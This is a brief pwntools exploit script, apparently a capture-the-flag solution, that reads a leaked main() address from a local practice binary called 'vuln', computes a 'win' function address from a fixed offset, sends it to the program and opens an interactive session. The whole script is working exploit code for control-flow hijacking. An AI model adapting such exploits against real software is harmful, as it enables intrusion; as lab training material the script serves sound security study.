from pwn import *

exe = ELF("./vuln", checksec=False)
p = process(exe.path)

input()

# Leak main address
p.recvuntil(b'main: ')
main_addr = p.recvuntil(b'\n', drop=True)
main_addr = int(main_addr, 16)
print("Main address: " + hex(main_addr))

# Calculate win
win = main_addr - 0x96
print("Win: " + hex(win))
p.sendlineafter(b'0x12345: ', hex(win).encode())

p.interactive()